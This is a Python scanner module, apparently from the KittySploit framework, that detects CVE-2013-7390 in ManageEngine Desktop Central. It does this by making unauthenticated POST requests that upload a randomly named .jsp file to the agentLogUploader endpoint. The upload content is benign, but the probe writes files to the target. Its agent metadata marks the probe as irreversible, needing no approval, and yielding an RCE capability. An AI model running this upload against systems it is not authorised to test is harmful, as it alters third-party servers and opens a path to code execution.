#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine Desktop Central agentLogUploader upload (CVE-2013-7390)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ManageEngine DC - agentLogUploader Detection (CVE-2013-7390)',
        'description': (
            'Detects CVE-2013-7390/2014-5007 by POSTing to agentLogUploader and '
            'matching X-dc-header: yes.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'manageengine', 'desktopcentral', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-7390',
        ],
        'cve': 'CVE-2013-7390',
    }

    def run(self):
        fname = self.random_text(8) + '.jsp'
        data = 'This file is uploaded by KittySploit for vulnerability testing'
        for base in ('', '/desktopcentral', '/DesktopCentral'):
            path = (
                f'{base}/agentLogUploader?computerName=DesktopCentral'
                f'&domainName=webapps&customerId=1&filename={fname}'
            )
            r = self.http_request(
                method='POST',
                path=path,
                data=data,
                headers={'Content-Type': 'text/html;'},
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            headers = {k.lower(): v for k, v in r.headers.items()}
            if headers.get('x-dc-header') == 'yes' or 'X-dc-header: yes' in str(r.headers):
                self.set_info(
                    severity='critical',
                    reason='ManageEngine DC agentLogUploader (CVE-2013-7390)',
                    path=f'{base}/agentLogUploader',
                )
                return True
            # also check header case-insensitively in raw join
            for k, v in r.headers.items():
                if k.lower() == 'x-dc-header' and 'yes' in v.lower():
                    self.set_info(
                        severity='critical',
                        reason='ManageEngine DC agentLogUploader (CVE-2013-7390)',
                        path=f'{base}/agentLogUploader',
                    )
                    return True
        return False
